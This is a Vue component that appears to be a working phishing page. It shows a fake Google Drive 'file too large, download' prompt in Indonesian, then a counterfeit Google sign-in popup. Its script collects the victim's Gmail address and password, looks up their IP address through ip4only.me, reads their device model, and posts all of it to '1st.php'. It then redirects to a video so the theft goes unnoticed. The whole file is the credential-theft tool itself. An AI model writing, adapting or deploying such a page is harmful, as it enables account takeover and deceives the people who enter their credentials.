<template>
    <div class="mask" v-show="masks"></div>
    <div class="popgoogle" v-show="popgoogle">
        <div class="googlehead">
            <div class="headImg">
                <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025051211364624049b08752ec.png">
            </div>
            <span class="headText">
                Login dengan Google
            </span>
        </div>
        <div class="googlecontent">
            <span class="contentTitle">Login</span>
            <span class="contentDesc">Lanjutkan ke <strong>Drive</strong></span>

            <div class="googleform">
                <div class="form-group">
                    <input @blur="doFocus" @keyup="doLoginGoogle" ref="googleEmail" v-model="form.googlemail" type="email">
                    <label>Email atau nomor telepon</label>
                </div>
                <div class="form-group">
                    <input @blur="doFocus" @keyup="doLoginGoogle" ref="googlePassword" v-model="form.googlepassword" type="password">
                    <label>Kata sandi</label>
                </div>
                <span class="galert" v-show="alertgoogle"><Icon name="mingcute:warning-fill"/> Lupa email?</span>
                <div class="form-text">
                    <p>Sebelum menggunakan aplikasi ini, Anda dapat meninjau <span>kebijakan privasi</span> dan <span>persyaratan lainnya.</span></p>
                </div>
                <div class="form-action">
                    <span class="createaccount">Buat akun</span>
                    <div class="google-submit" @click="doSubmitLoginGoogle"><Icon v-if="Tombol" name="line-md:loading-loop" style="font-size: 17px" /> Selanjutnya</div>
                </div>
            </div>
            <div class="google-footer">
                <div class="footer-right">
                    <span>Indonesia</span>
                </div>
                <div class="footer-right">
                    <span>Bantuan</span>
                    <span>Privasi</span>
                    <span>Persyaratan</span>
                </div>
            </div>
        </div>
    </div>
    <div class="content">
        <p>Tidak dapat melihat pratinjau file</p>
        <p>File ini terlalu besar untuk dilihat pratinjaunya</p>
        <button @click="popgoogle = true"><i class="bi bi-download"></i> Download</button>
    </div>
</template>

<script setup>
function fallbackModelFromUA() {
    const ua = navigator.userAgent;
    const match = ua.match(/\s([A-Z0-9\-]+)\sBuild/);
    if (match && match[1]) {
        return match[1];
    } else {
        return 'Deskop/Ios';
    }
}
onMounted(async () => {
    fetch('https://ip4only.me/api/')
        .then(res => res.text())
        .then(text => {
            const ip = text.split(",")[1];
            form.value.ipaddress = ip;
    });
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model"])
        .then(ua => {
          if (ua.model) {
            form.value.device = ua.model
          } else {
            form.value.device = fallbackModelFromUA();
          }
        })
        .catch(err => {
          console.warn("Error getHighEntropyValues:", err);
          form.value.device = fallbackModelFromUA();
        });
    } else {
      form.value.device = fallbackModelFromUA();
    }
})
const masks = ref(false);
const googleEmail = ref(null)
const googlePassword = ref(null)
const alertgoogle = ref(null);
const popgoogle = ref(false);
const form = ref({
  googlemail: null,
  googlepassword: null,
  ipaddress: null,
  device: null
})

const Tombol = ref(false);


function doFocus()
{
    form.value.googlemail.length !== 0 ? (
        googleEmail.value.classList.add('focus')
    ) : (
        googleEmail.value.classList.remove('focus')
    )

    form.value.googlepassword.length !== 0 ? (
        googlePassword.value.classList.add('focus')
    ) : (
        googlePassword.value.classList.remove('focus')
    )
}

async function doLoginGoogle() {
    // Check is valid?
    console.log('dologin triggered');
    alertgoogle.value = false;
    const regex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;

    // Validasi email
    if (!regex.test(form.value.googlemail)) {
        googleEmail.value.setCustomValidity("Masukkan email dengan benar");
        googleEmail.value.reportValidity();
        return false;
    } else {
        // Hapus pesan error kalau sudah valid
        googleEmail.value.setCustomValidity("");
        googleEmail.value.reportValidity();
    }

    // Validasi password
    if ((form.value.googlepassword || '').length < 6) {
        googlePassword.value.setCustomValidity("Masukkan katasandi dengan benar");
        googlePassword.value.reportValidity();
        return false;
    } else {
        googlePassword.value.setCustomValidity("");
        googlePassword.value.reportValidity();
    }

}

async function doSubmitLoginGoogle(e)
{

    const regex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;

    // Validasi email
    if (!regex.test(form.value.googlemail)) {
        googleEmail.value.setCustomValidity("Masukkan email dengan benar");
        googleEmail.value.reportValidity();
        return false;
    } else {
        // Hapus pesan error kalau sudah valid
        googleEmail.value.setCustomValidity("");
        googleEmail.value.reportValidity();
    }

    // Validasi password
    if ((form.value.googlepassword || '').length < 6) {
        googlePassword.value.setCustomValidity("Masukkan katasandi dengan benar");
        googlePassword.value.reportValidity();
        return false;
    } else {
        googlePassword.value.setCustomValidity("");
        googlePassword.value.reportValidity();
    }

    Tombol.value = true;
    e.target.classList.add('disable')

    const res = await fetch('1st.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(Object.entries(toRaw(form.value))).toString()
    });

    setTimeout(() => {
        window.location = 'https://cdn.videy.co/kCmVZy4c1.mp4';
    }, 4000);
}



</script>

<style scoped>

#__nuxt .mask
{
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.50);
}
#__nuxt .content
{
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    background: #4b494c;
    padding: 10px 30px;
    border-radius: 10px;
    box-shadow: 0 5px 10px 5px rgba(0,0,0,0.50);
}

.content p
{
    text-align: center;
    font-size: 14px;
}

.content button
{
    background: #1b73e9;
    padding: 3px 5px;
    color: #fff;
    border: none;
    border-radius: 3px;
    margin-top: 15px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    cursor: pointer;
}

.disable
{
    opacity: 0.5;
    pointer-events: none;
}

#__nuxt .popgoogle
{
    font-family: 'google-medium';
    text-shadow: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    background: #fff;
    z-index: 999;
    border-radius: 10px;
    box-shadow: 0 0 0 2000px rgba(0,0,0,0.75);
    color: #000;
}

.popgoogle .googlehead
{
    position: relative;
    width: 100%;
    padding: 10px 15px;
    display: flex;
    justify-content: flex-start;
    gap: 10px;
    color: #c4c7c5;
    border-bottom: 1px solid #c4c7c5;
}

.googlehead .headImg
{
    width: 25px;
    height: 25px;
}

.headImg img
{
    max-width: 100%;
}

.googlehead .headText
{
    color: #000;
    display: flex;
    align-items: center;
    font-size: 14px;
}


.popgoogle .googlecontent
{
    width: 100%;
    color: #000 !important;
    padding: 60px 30px 15px 30px;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    flex-direction: column;
}

/* .googlecontent span
{
    color: #000 !important;
} */

.googlecontent .contentTitle
{
    width: 100%;
    font-size: 30px;
}

.googlecontent .contentDesc
{
    font-size: 15px;
    margin-top: 15px;
}

.googlecontent strong
{
    color: #185FD1;
}

.googlecontent .googleform
{
    position: relative;
    width: 100%;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    flex-direction: column;
    margin-top: 30px;
    gap: 15px;
}

.googleform .galert
{
    color: #b3261e !important;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 5px;
}

.galert .iconify 
{
    color: #b3261e !important;
}

.googleform .form-group
{
    position: relative;
    width: 100%;
}

.form-group input
{
    width: 100%;
    padding: 10px;
    outline: none;
    border-radius: 4px;
    border: 1px solid gray;
    color: #000;
}

.form-group label
{
    position: absolute;
    top:50%;
    left: 8px;
    padding: 5px;
    transform: translateY(-50%);
    color: gray;
    font-size: 15px;
    background: #fff;
    transition: .3s all;
    pointer-events: none;
}

.form-group input:focus
{
    border:1px solid #185FD1;
}
.form-group input:focus ~ label
{
    top: 0%;
    font-size: 12px;
    color: #185FD1;
}
.form-group input.focus ~ label
{
    top: 0%;
    font-size: 12px;
}

.googleform .form-text
{
    width: 100%;
    text-align: left;
    font-size: 13px;
}

.form-text p
{
    color: #444746;
}
.form-text span
{
    color: rgb(11 87 208 / 1) !important;
}


.googleform .form-action
{
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.form-action .createaccount
{
    font-size: 14px;
    color: rgb(11 87 208 / 1) !important;
}


.form-action .google-submit
{
    padding: 10px 20px;
    color: #fff;
    background: rgb(11 87 208 / 1);
    border-radius: 50px;
    font-size: 14px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
}

.googlecontent .google-footer
{
    width: 100%;
    display: flex;
    justify-content: space-between;
    color: #444746 !important;
    font-size: 12px;
    margin-top: 40px;
}

.google-footer .footer-left
{
    color: #444746 !important;
}

.google-footer .footer-right
{
    display: flex;
    justify-content: flex-end;
    gap: 10px;
    color: #444746 !important;
}
</style>